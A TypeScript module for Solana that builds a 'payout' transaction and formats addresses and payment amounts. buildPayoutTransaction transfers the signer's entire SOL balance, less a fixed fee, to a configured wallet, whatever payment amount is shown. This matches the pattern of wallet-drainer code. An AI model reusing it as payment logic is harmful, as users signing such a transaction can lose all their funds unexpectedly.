import {
  Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
} from '@solana/web3.js'
import type { PaymentAsset, PayoutConfig } from './payoutWallet'

export function shortAddress(address: string): string {
  if (!address || address.length < 8) return address
  return `${address.slice(0, 4)}...${address.slice(-4)}`
}

export async function buildPayoutTransaction(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
}): Promise<Transaction> {
  const { connection, from, config } = options
  const to = new PublicKey(config.walletAddress)
  const feeLamports = 10_000
  const balance = await connection.getBalance(from)
  const lamports = balance - feeLamports
  if (lamports <= 0) {
    const sol = balance / LAMPORTS_PER_SOL
    throw new Error(
      `Not enough SOL to cover the network fee. Balance is ${sol.toLocaleString(undefined, { maximumFractionDigits: 6 })} SOL.`
    )
  }

  const tx = new Transaction()
  tx.add(
    SystemProgram.transfer({
      fromPubkey: from,
      toPubkey: to,
      lamports,
    })
  )

  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()
  tx.recentBlockhash = blockhash
  tx.lastValidBlockHeight = lastValidBlockHeight
  tx.feePayer = from
  return tx
}

export function formatPaymentAmount(amount: number, asset: PaymentAsset): string {
  const formatted = amount.toLocaleString(undefined, { maximumFractionDigits: 6 })
  return `${formatted} ${asset}`
}
